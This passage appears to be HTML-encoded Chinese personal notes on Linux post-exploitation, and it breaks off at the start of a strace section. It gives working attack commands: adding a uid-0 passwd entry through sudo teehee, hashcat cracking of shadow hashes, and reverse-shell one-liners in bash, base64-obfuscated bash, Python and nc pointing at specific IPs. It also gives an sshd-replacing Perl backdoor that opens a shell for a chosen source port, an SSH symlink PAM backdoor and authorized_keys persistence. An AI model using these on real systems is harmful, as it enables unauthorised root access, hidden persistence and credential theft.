+<h3 id="&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x63D0;&#x6743;">&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x63D0;&#x6743;</h3>
+<p>&#x672C;&#x8D28;&#x4E0A;&#x8FD8;&#x662F;suid&#x63D0;&#x6743;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x5177;&#x6709;suid&#x6743;&#x9650;&#x7684;&#x547D;&#x4EE4;&#x662F;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#xFF0C;&#x8C03;&#x7528;&#x4E86;&#x5176;&#x4ED6;&#x547D;&#x4EE4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x52AB;&#x6301;&#x8C03;&#x7528;&#x7684;&#x5176;&#x4ED6;&#x547D;&#x4EE4;&#x6765;&#x63D0;&#x6743;&#x3002;</p>
+<p>&#x6BD4;&#x5982;&#x6709;&#x4E00;&#x4E2A;root&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x5177;&#x6709;suid&#x6743;&#x9650;&#x7684;test&#x547D;&#x4EE4;&#xFF0C;&#x8C03;&#x7528;&#x4E86;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;ls&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x53EF;&#x5199;&#x76EE;&#x5F55;&#xFF0C;&#x901A;&#x8FC7;&#x4FEE;&#x6539;$PATH&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF0C;&#x52AB;&#x6301;ls&#x547D;&#x4EE4;&#x3002;</p>
+<p>&#x53C2;&#x8003;<a href="https://fgtbnc.github.io/2023/05/31/&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x6CE8;&#x5165;/" target="_blank">&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x6CE8;&#x5165; | Khaz&apos;s Blog (fgtbnc.github.io)</a></p>
+<h3 id="&#x6743;&#x9650;&#x914D;&#x7F6E;&#x4E0D;&#x5F53;&#x63D0;&#x6743;">&#x6743;&#x9650;&#x914D;&#x7F6E;&#x4E0D;&#x5F53;&#x63D0;&#x6743;</h3>
+<p>&#x539F;&#x7406;&#xFF1A;&#x67D0;&#x4E2A;&#x811A;&#x672C;&#x6216;&#x547D;&#x4EE4;&#x4EE5;ROOT&#x6743;&#x9650;&#x8FD0;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#x62E5;&#x6709;&#x4FEE;&#x6539;&#x5199;&#x5165;&#x6743;&#x9650;</p>
+<ul>
+<li>&#x901A;&#x8FC7;pspy&#x627E;&#x5230;&#x53EF;&#x7591;&#x8FDB;&#x7A0B;</li>
+<li>&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;</li>
+<li>.....</li>
+</ul>
+<p>&#x5DE5;&#x5177;&#xFF1A;<a href="https://github.com/mi1k7ea/M7-05" target="_blank">https://github.com/mi1k7ea/M7-05</a></p>
+<h3 id="cve-2021-4034">CVE-2021-4034</h3>
+<pre class="language-"><code>pkexec suid&#x63D0;&#x6743;
+</code></pre><h3 id="&#x5176;&#x4ED6;">&#x5176;&#x4ED6;</h3>
+<h4 id="teehee">teehee</h4>
+<p>teehee&#x662F;&#x4E2A;&#x5C0F;&#x4F17;&#x7684;linux&#x7F16;&#x8F91;&#x5668;&#x3002;&#x5982;&#x679C;&#x6709;sudo&#x6743;&#x9650;&#x3002;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5176;&#x6765;&#x63D0;&#x6743;</p>
+<p>&#x6838;&#x5FC3;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x5229;&#x7528;&#x5176;&#x5728;passwd&#x6587;&#x4EF6;&#x4E2D;&#x8FFD;&#x52A0;&#x4E00;&#x6761;uid&#x4E3A;0&#x7684;&#x7528;&#x6237;&#x6761;&#x76EE;</p>
+<pre class="language-"><code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd
+</code></pre><p>&#x6309;&#x7167;linux&#x7528;&#x6237;&#x673A;&#x5236;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;shadow&#x6761;&#x76EE;&#xFF0C;&#x4E14;passwd&#x7528;&#x6237;&#x5BC6;&#x7801;&#x6761;&#x76EE;&#x4E3A;&#x7A7A;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x672C;&#x5730;&#x76F4;&#x63A5;su&#x7A7A;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#xFF08;&#x7A7A;&#x5BC6;&#x7801;&#x4E0D;&#x80FD;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF09;&#x3002;&#x6240;&#x4EE5;&#x53EA;&#x9700;&#x8981;&#x6267;&#x884C;su raaj&#x5C31;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x5230;raaj&#x7528;&#x6237;&#xFF0C;&#x8FD9;&#x4E2A;&#x7528;&#x6237;&#x56E0;&#x4E3A;uid&#x4E3A;0&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x662F;root&#x6743;&#x9650;</p>
+<h1 id="linux&#x4FE1;&#x606F;&#x6536;&#x96C6;">Linux&#x4FE1;&#x606F;&#x6536;&#x96C6;</h1>
+<ul>
+<li><p>&#x76F8;&#x5173;&#x547D;&#x4EE4;</p>
+<pre class="language-"><code class="lang-bash"><span class="token function">ifconfig</span>
+/sbin/iconfig
+<span class="token function">ip</span> addr show
+</code></pre>
+</li>
+</ul>
+<ul>
+<li><p>&#x6574;&#x5408;&#x5DE5;&#x5177;</p>
+<pre class="language-"><code class="lang-bash">./gather <span class="token parameter variable">-a</span>
+</code></pre>
+<p>&#x9ED8;&#x8BA4;&#x5728;<code>/tmp/report</code>&#x4E0B;&#x751F;&#x6210;&#x7ED3;&#x679C;</p>
+<pre class="language-"><code class="lang-bash">keyword.txt <span class="token comment"># &#x8FD9;&#x4E2A;&#x6709;&#x70B9;&#x5C11;&#xFF0C;&#x8981;&#x81EA;&#x5DF1;&#x52A0;</span>
+result.txt
+tree.txt <span class="token comment"># &#x76EE;&#x5F55;&#x7ED3;&#x6784;</span>
+</code></pre>
+<p><strong>&#x81EA;&#x5DF1;&#x6DFB;&#x52A0;&#x547D;&#x4EE4;&#x6574;&#x7406;&#x6210;sh&#x811A;&#x672C;</strong></p>
+</li>
+</ul>
+<h1 id="linux&#x6A2A;&#x5411;&#x79FB;&#x52A8;">Linux&#x6A2A;&#x5411;&#x79FB;&#x52A8;</h1>
+<ul>
+<li><p>&#x5BC6;&#x7801;&#x7834;&#x89E3;</p>
+<ul>
+<li><p>&#x5224;&#x65AD;<code>/etc/shadow</code>&#x6216;<code>/etc/passwd</code>&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x5BC6;&#x7801;&#x4F7F;&#x7528;&#x7684;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;</p>
+</li>
+<li><p><strong>MD5</strong>: &#x4EE5; &quot;$1$&quot; &#x5F00;&#x5934;&#x3002;</p>
+<ul>
+<li><strong>SHA-256</strong>: &#x4EE5; &quot;$5$&quot; &#x5F00;&#x5934;&#x3002;</li>
+<li><strong>SHA-512</strong>: &#x4EE5; &quot;$6$&quot; &#x5F00;&#x5934;&#x3002;</li>
+<li><strong>Blowfish</strong>: &#x4EE5; &quot;$2a$&quot;&#x3001;&quot;$2b$&quot; &#x6216;&#x8005; &quot;$2y$&quot; &#x5F00;&#x5934;&#x3002;</li>
+<li><strong>DES</strong>: &#x4EE5; &quot;$&quot; &#x5F00;&#x5934;&#xFF0C;&#x8DDF;&#x7740;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#x3002;</li>
+<li><strong>Extended DES</strong>: &#x4EE5; &quot;$9$&quot; &#x5F00;&#x5934;&#x3002;</li>
+<li><strong>Sun MD5</strong>: &#x4EE5; &quot;$md5$&quot; &#x5F00;&#x5934;&#x3002;</li>
+<li><strong>SHA-1</strong>: &#x4EE5; &quot;$sha1$&quot; &#x5F00;&#x5934;&#x3002;</li>
+<li><strong>NTLM</strong>: &#x4EE5; &quot;$NT$&quot; &#x6216; &quot;$NTLM$&quot; &#x5F00;&#x5934;&#x3002;</li>
+</ul>
+</li>
+<li><p>&#x66B4;&#x529B;&#x7834;&#x89E3;</p>
+<pre class="language-"><code class="lang-shell">hashcat.exe  <span class="token parameter variable">-m</span> <span class="token number">1600</span>  <span class="token parameter variable">-a</span>  <span class="token number">0</span>  <span class="token string">&quot;E:<span class="token entity" title="\5">\5</span>.0\pass.txt&quot;</span> <span class="token string">&quot;E:<span class="token entity" title="\5">\5</span>.0<span class="token entity" title="\r">\r</span>ockyou.txt&quot;</span>
+<span class="token comment"># -a 0 &#x5B57;&#x5178;&#x653B;&#x51FB;</span>
+<span class="token comment"># -m &#x6307;&#x5B9A;&#x5BC6;&#x6587;&#x7C7B;&#x578B;</span>
+<span class="token comment"># pass.txt&#x4E2D;&#x53EA;&#x80FD;&#x653E;&#x5BC6;&#x7801;&#x5BC6;&#x6587;&#xFF0C;/etc/passwd&#x62FF;&#x5230;&#x7684;&#x8981;&#x53BB;&#x6389;user:</span>
+</code></pre>
+<p>hash id&#x5BF9;&#x7167;&#x8868;&#xFF1A;<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+<p>&#x6587;&#x7AE0;&#xFF1A;<a href="https://xz.aliyun.com/t/4008?time__1311=n4%2BxnD0DyGYQqY5i%3DDCDlhjeK0KPahGRTRrD" target="_blank">https://xz.aliyun.com/t/4008?time__1311=n4%2BxnD0DyGYQqY5i%3DDCDlhjeK0KPahGRTRrD</a></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="linux&#x6743;&#x9650;&#x7EF4;&#x6301;">Linux&#x6743;&#x9650;&#x7EF4;&#x6301;</h1>
+<h2 id="&#x53CD;&#x5F39;shell">&#x53CD;&#x5F39;shell</h2>
+<h3 id="&#x5E38;&#x7528;&#x547D;&#x4EE4;">&#x5E38;&#x7528;&#x547D;&#x4EE4;</h3>
+<ul>
+<li><p>&#x653B;&#x51FB;&#x673A;&#x76D1;&#x542C;&#x7AEF;&#x53E3;</p>
+<pre class="language-"><code class="lang-bash"><span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> port
+</code></pre>
+</li>
+<li><p>&#x88AB;&#x653B;&#x51FB;&#x673A;</p>
+<pre class="language-"><code class="lang-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">&apos;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&apos;</span>
+<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">&quot;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}&quot;</span>
+</code></pre>
+<pre class="language-"><code class="lang-bash">python <span class="token parameter variable">-c</span> <span class="token string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>&apos;<span class="token number">192.168</span><span class="token number">.174</span><span class="token number">.129</span>&apos;<span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;])&quot;</span>
+</code></pre>
+<pre class="language-"><code class="lang-bash"><span class="token function">nc</span> <span class="token number">124.220</span>.192.120 <span class="token number">1234</span> <span class="token parameter variable">-e</span> /bin/bash
+</code></pre>
+<p><strong>&#x6CE8;&#x610F;&#x70B9;</strong>&#xFF1A;&#x7528;nc&#x8FDB;&#x884C;&#x53CD;&#x5F39;shell&#xFF0C;&#x9700;&#x8981;nc&#x662F;&#x63D0;&#x4F9B;-e&#x53C2;&#x6570;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x4F46;&#x662F;&#x7CFB;&#x7EDF;apt&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;&#x90FD;&#x662F;&#x4E0D;&#x63D0;&#x4F9B;&#x53CD;&#x5411;&#x94FE;&#x63A5;&#x7684;&#x7248;&#x672C;&#x3002;</p>
+<p><img src="../../../blog/source/images/image-20230830215804216.png" alt="image-20230830215804216"></p>
+<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<ul>
+<li><p>&#x4E0A;&#x4F20;&#x7F16;&#x8BD1;&#x597D;&#x7684;nc</p>
+</li>
+<li><p>&#x5229;&#x7528;&#x7BA1;&#x9053;&#x7B26;</p>
+<p>&#x88AB;&#x653B;&#x51FB;&#x673A;</p>
+<p><img src="../../../blog/source/images/image-20230823145240080.png" alt="image-20230823145240080"></p>
+<p>&#x653B;&#x51FB;&#x673A;</p>
+<p><img src="../../../blog/source/images/image-20230823145311118.png" alt="image-20230823145311118"></p>
+<p><img src="../../../blog/source/images/image-20230823145323881.png" alt="image-20230823145323881"></p>
+<p>&#x5229;&#x7528;1234&#x7AEF;&#x53E3;&#x5C06;&#x4F20;&#x5165;&#x5185;&#x5BB9;&#x4EA4;&#x7ED9;bash&#x6267;&#x884C;&#xFF0C;&#x518D;&#x5C06;&#x5185;&#x5BB9;&#x4ECE;&#x7AEF;&#x53E3;8888&#x9001;&#x51FA;&#x53BB;</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="&#x83B7;&#x5F97;&#x4EA4;&#x4E92;&#x5F0F;shell">&#x83B7;&#x5F97;&#x4EA4;&#x4E92;&#x5F0F;shell</h3>
+<pre class="language-"><code class="lang-shell">python3 <span class="token parameter variable">-c</span>  <span class="token string">&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span>
+python <span class="token parameter variable">-c</span>  <span class="token string">&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span>
+</code></pre>
+<p>&#x952E;&#x5165; Ctrl-Z&#xFF0C;&#x56DE;&#x5230; VPS &#x7684;&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#xFF1B;&#x7B2C;&#x4E8C;&#x6B65;&#xFF0C;&#x5728; VPS &#x4E2D;&#x6267;&#x884C;&#xFF1A;</p>
+<pre class="language-"><code class="lang-shell">stty raw <span class="token parameter variable">-echo</span>
+<span class="token function">fg</span>
+</code></pre>
+<p>&#x56DE;&#x5230;&#x54D1; shell &#x4E2D;&#xFF1B;&#x7B2C;&#x4E09;&#x6B65;&#xFF0C;&#x5728;&#x54D1; shell &#x4E2D;&#x952E;&#x5165; Ctrl-l&#xFF0C;&#x6267;&#x884C;&#xFF1A;</p>
+<pre class="language-"><code class="lang-shell">reset
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>bash
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm-256color
+stty rows <span class="token number">54</span> columns <span class="token number">104</span>
+</code></pre>
+<h2 id="ssh&#x540E;&#x95E8;">SSH&#x540E;&#x95E8;</h2>
+<h3 id="ssh-wrapper">SSH wrapper</h3>
+<p>&#x88AB;&#x653B;&#x51FB;&#x673A;</p>
+<blockquote>
+<p>&#x9996;&#x5148;&#x542F;&#x52A8;&#x7684;&#x662F;/usr/sbin/sshd,&#x811A;&#x672C;&#x6267;&#x884C;&#x5230;getpeername&#x8FD9;&#x91CC;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6B63;&#x5219;&#x5339;&#x914D;&#x4F1A;&#x5931;&#x8D25;&#xFF0C;&#x4E8E;&#x662F;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x53E5;&#xFF0C;&#x542F;&#x52A8;/usr/bin/sshd&#xFF0C;&#x8FD9;&#x662F;&#x539F;&#x59CB;sshd&#x3002;&#x539F;&#x59CB;&#x7684;sshd&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x5EFA;&#x7ACB;&#x4E86;tcp&#x8FDE;&#x63A5;&#x540E;&#xFF0C;&#x4F1A;fork&#x4E00;&#x4E2A;&#x5B50;&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x5177;&#x4F53;&#x5DE5;&#x4F5C;&#x3002;&#x8FD9;&#x4E2A;&#x5B50;&#x8FDB;&#x7A0B;&#xFF0C;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x68C0;&#x9A8C;&#xFF0C;&#x800C;&#x662F;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x7684;&#x4F4D;&#x7F6E;&#x7684;/usr/sbin/sshd&#xFF0C;&#x8FD9;&#x6837;&#x5B50;&#x63A7;&#x5236;&#x6743;&#x53C8;&#x56DE;&#x5230;&#x811A;&#x672C;&#x4E86;&#x3002;&#x6B64;&#x65F6;&#x5B50;&#x8FDB;&#x7A0B;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x5DF2;&#x88AB;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x5957;&#x63A5;&#x5B57;&#xFF0C;getpeername&#x80FD;&#x771F;&#x7684;&#x83B7;&#x53D6;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;TCP&#x6E90;&#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x662F;19526&#x5C31;&#x6267;&#x884C;sh&#x7ED9;&#x4E2A;shell</p>
+<p>&#x7B80;&#x5355;&#x70B9;&#x5C31;&#x662F;&#x4ECE;sshd fork&#x51FA;&#x4E00;&#x4E2A;&#x5B50;&#x8FDB;&#x7A0B;&#xFF0C;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x5957;&#x63A5;&#x5B57;&#xFF0C;&#x5E76;&#x5BF9;&#x8FDE;&#x8FC7;&#x6765;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x7AEF;&#x53E3;&#x8FDB;&#x884C;&#x4E86;&#x5224;&#x65AD;&#x3002;</p>
+</blockquote>
+<pre class="language-"><code class="lang-shell"><span class="token builtin class-name">cd</span> /usr/sbin/
+<span class="token function">mv</span> sshd <span class="token punctuation">..</span>/bin
+
+<span class="token comment"># &#x4F1A;&#x5BFC;&#x81F4;ssh&#x4E0D;&#x80FD;&#x7528;</span>
+<span class="token builtin class-name">echo</span> <span class="token string">&apos;#!/usr/bin/perl&apos;</span> <span class="token operator">&gt;</span>sshd
+<span class="token builtin class-name">echo</span> <span class="token string">&apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos;</span> <span class="token operator">&gt;&gt;</span>sshd  
+<span class="token builtin class-name">echo</span> <span class="token string">&apos;exec{&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&apos;</span> <span class="token operator">&gt;&gt;</span>sshd
+<span class="token function">chmod</span> u+x sshd
+
+<span class="token function">service</span> sshd restart
+</code></pre>
+<blockquote>
+<p> \x00\x004A&#x662F;13377&#x7684;&#x5927;&#x7AEF;&#x5F62;&#x5F0F;</p>
+</blockquote>
+<p>&#x653B;&#x51FB;&#x673A;</p>
+<pre class="language-"><code class="lang-shell">socat STDIO TCP4:IP:22,sourceport<span class="token operator">=</span>port
+</code></pre>
+<p><img src="../images/image-20230823151639936.png" alt="image-20230823151639936"></p>
+<p>&#x4FEE;&#x6539;&#x901A;&#x4FE1;&#x7AEF;&#x53E3;</p>
+<pre class="language-"><code class="lang-python"><span class="token comment"># python2</span>
+<span class="token keyword">import</span> struct
+port <span class="token operator">=</span> <span class="token number">19526</span>
+<span class="token builtin">buffer</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&apos;&gt;I6&apos;</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token builtin">repr</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
+
+<span class="token operator">&gt;&gt;</span><span class="token string">&apos;\x00\x00LF&apos;</span>
+
+echo <span class="token string">&apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos;</span> <span class="token operator">&gt;&gt;</span>sshd 
+&#x53D8;&#x4E3A;
+echo <span class="token string">&apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..LF/);&apos;</span> <span class="token operator">&gt;&gt;</span>sshd
+</code></pre>
+<h3 id="ssh-&#x8F6F;&#x8FDE;&#x63A5;&#x540E;&#x95E8;">SSH &#x8F6F;&#x8FDE;&#x63A5;&#x540E;&#x95E8;</h3>
+<blockquote>
+<ol>
+<li><p>PAM&#x8BA4;&#x8BC1;&#x673A;&#x5236;&#xFF0C;&#x82E5;sshd&#x670D;&#x52A1;&#x4E2D;&#x5F00;&#x542F;&#x4E86;PAM&#x8BA4;&#x8BC1;&#x673A;&#x5236;&#xFF08;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;<code>cat /etc/ssh/sshd_config|grep UsePAM</code>&#xFF09;&#xFF0C;&#x5F53;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x65F6;&#xFF0C;PAM&#x6A21;&#x5757;&#x5219;&#x4F1A;&#x641C;&#x5BFB;PAM&#x76F8;&#x5173;&#x8BBE;&#x5B9A;&#x6587;&#x4EF6;&#xFF0C;&#x8BBE;&#x5B9A;&#x6587;&#x4EF6;&#x4E00;&#x822C;&#x662F;&#x5728;/etc/pam.d/&#x3002;&#x82E5;&#x5173;&#x95ED;&#x5219;&#x4F1A;&#x9A8C;&#x8BC1;&#x5BC6;&#x7801;&#xFF0C;&#x65E0;&#x6CD5;&#x5EFA;&#x7ACB;&#x8F6F;&#x94FE;&#x63A5;&#x540E;&#x95E8;&#x3002;</p>
+</li>
+<li><p>pam_rootok.so&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x662F;&#x4F7F;&#x5F97;uid&#x4E3A;0&#x7684;&#x7528;&#x6237;&#xFF0C;&#x5373;root&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x8BA4;&#x8BC1;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x3002;</p>
+</li>
+<li><p><code>find /etc/pam.d |xargs grep &quot;pam_rootok&quot;</code></p>
+<p><img src="../images/image-20230830230859930.png" alt="image-20230830230859930"></p>
+<p><strong>&#x8FD9;&#x4E9B;&#x90FD;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;ssh&#x8F6F;&#x94FE;&#x63A5;&#x540E;&#x95E8;</strong>&#xFF1A;&#x5F53;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x7279;&#x5B9A;&#x7684;&#x7AEF;&#x53E3;&#x8FDE;&#x63A5;ssh&#x540E;&#xFF0C;&#x5E94;&#x7528;&#x5728;&#x542F;&#x52A8;&#x8FC7;&#x7A0B;&#x4E2D;&#x5C31;&#x4F1A;&#x53BB;&#x627E;&#x5230;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#xFF1A;&#x6211;&#x4EEC;&#x7684;&#x8F6F;&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x4E3A;/tmp/su&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x7528;&#x5C31;&#x4F1A;&#x627E;/etc/pam.d/su&#x4F5C;&#x4E3A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x56E0;&#x4E3A;/etc/pam.d/su&#x4F7F;&#x7528;&#x4E86;pam_rootok.so&#x6240;&#x4EE5;&#x65E0;&#x9700;&#x9A8C;&#x8BC1;&#x5BC6;&#x7801;&#x5373;&#x53EF;&#x8FDE;&#x63A5;&#x3002;</p>
+</li>
+</ol>
+</blockquote>
+<p>&#x5931;&#x8D25;&#x4E86;&#x3002;&#x3002;</p>
+<p><img src="../images/image-20230830222011164.png" alt="image-20230830222011164"></p>
+<p>&#x662F;&#x56E0;&#x4E3A;SSH wrapper</p>
+<pre class="language-"><code class="lang-shell"><span class="token builtin class-name">echo</span> <span class="token string">&apos;#!/usr/bin/perl&apos;</span> <span class="token operator">&gt;</span>sshd
+</code></pre>
+<p>&#x9700;&#x8981;&#x91CD;&#x65B0;&#x5B89;&#x88C5;ssh</p>
+<pre class="language-"><code class="lang-shell"><span class="token function">ln</span> <span class="token parameter variable">-sf</span> /usr/sbin/su /tmp/su
+/tmp/su <span class="token parameter variable">-oPort</span><span class="token operator">=</span><span class="token number">8888</span>
+</code></pre>
+<p><img src="../images/image-20230830230550836.png" alt="image-20230830230550836"></p>
+<p>&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x968F;&#x4FBF;&#x8F93;&#x4E00;&#x4E2A;&#x5BC6;&#x7801;&#x5C31;&#x53EF;&#x4EE5;&#x767B;&#x9646;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x80FD;&#x4E0D;&#x8F93;&#x5BC6;&#x7801;&#x3002;</p>
+<h3 id="ssh-&#x516C;&#x94A5;&#x514D;&#x5BC6;&#x767B;&#x9646;">SSH &#x516C;&#x94A5;&#x514D;&#x5BC6;&#x767B;&#x9646;</h3>
+<p>&#x4E4B;&#x524D;&#x6253;&#x9776;&#x673A;&#x7684;&#x65F6;&#x5019;&#x7684;&#x7B14;&#x8BB0;</p>
+<p>ssh&#x9A8C;&#x8BC1;&#x65B9;&#x5F0F;</p>
+<p><img src="../images/image-20230304140701229-1693405604693.png" alt="image-20230304140701229"></p>
+<p>&#x8FD9;&#x91CC;&#x7B2C;&#x4E8C;&#x79CD;&#xFF1A;&#x5047;&#x8BBE;&#x4E3B;&#x673A;A&#x8981;&#x7528;SSH&#x767B;&#x5F55;&#x5230;&#x4E3B;&#x673A;B&#xFF0C;&#x90A3;&#x4E48;&#x53EA;&#x8981;&#x4E3B;&#x673A;A&#x6709;&#x79C1;&#x94A5;&#xFF0C;&#x4E3B;&#x673A;B&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x516C;&#x94A5;&#x5373;&#x53EF;&#xFF0C;&#x4E0E;&#x662F;&#x4E3B;&#x673A;A&#x751F;&#x4EA7;&#x7684;&#xFF0C;&#x8FD8;&#x662F;&#x4E3B;&#x673A;B&#x751F;&#x6210;&#x7684;&#x65E0;&#x5173;&#x3002;</p>
+<pre class="language-"><code class="lang-shell"><span class="token comment"># host&#x4E3A;&#x4E3B;&#x673A;&#x540D;&#xFF08;root&#xFF09;</span>
+<span class="token function">ssh</span> host@ip <span class="token parameter variable">-p</span> port&#xFF08;password&#x9A8C;&#x8BC1;&#xFF09;
+<span class="token function">ssh</span> host@ip <span class="token parameter variable">-i</span> id_rsa <span class="token parameter variable">-p</span> port<span class="token punctuation">(</span>&#x5BC6;&#x94A5;&#x9A8C;&#x8BC1;&#xFF0C;&#x79C1;&#x94A5;&#x6743;&#x9650;&#x8981;&#x4E3A;600&#x624D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<span class="token punctuation">)</span>
+</code></pre>
+<p>&#x914D;&#x7F6E;&#x6587;&#x4EF6;<code>/etc/ssh/sshd_config</code></p>
+<pre class="language-"><code class="lang-shell">PasswordAuthentication <span class="token function">yes</span>                         <span class="token comment">#&#x542F;&#x7528;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;</span>
+PubkeyAuthentication <span class="token function">yes</span>                         <span class="token comment">#&#x542F;&#x7528;&#x5BC6;&#x94A5;&#x5BF9;&#x9A8C;&#x8BC1;</span>
+AuthorizedKeysFile .ssh/authorized_keys         <span class="token comment">#&#x6307;&#x5B9A;&#x516C;&#x94A5;&#x5E93;&#x6587;&#x4EF6;</span>
+</code></pre>
+<p>&#x6D41;&#x7A0B;</p>
+<pre class="language-"><code class="lang-shell">ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token comment"># &#x751F;&#x6210;&#x5BC6;&#x94A5;&#x5BF9;</span>
+<span class="token function">cat</span> id_rsa.pub <span class="token operator">&gt;</span> authorized_keys <span class="token comment">#&#x5C06;&#x516C;&#x94A5;&#x5185;&#x5BB9;&#x653E;&#x5230;&#x76EE;&#x6807;.ssh/authorized_keys&#x91CC; </span>
+
+ssh-copy-id host@ip <span class="token parameter variable">-p</span> <span class="token number">22</span> <span class="token comment">#&#x5C06;&#x516C;&#x94A5;&#x4E0A;&#x4F20;&#x81F3;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E2D;</span>
+</code></pre>
+<h2 id="strace&#x540E;&#x95E8;">strace&#x540E;&#x95E8;</h2>
+<p>&#x901A;&#x8FC7;<strong>&#x547D;&#x4EE4;&#x66FF;&#x6362;&#xFF08;&#x547D;&#x4EE4;&#x884C;&#x542F;&#x52A8;&#x6587;&#x4EF6;&#x52A0;&#x5165;alias&#xFF09;</strong>&#x52A8;&#x6001;&#x8DDF;&#x8E2A;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x548C;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x8BB0;&#x5F55;&#x7528;&#x6237;ssh&#x3001;su&#x3001;sudo&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>
+<pre class="language-"><code class="lang-shell"><span class="token comment"># &#x76D1;&#x63A7;ssh</span>
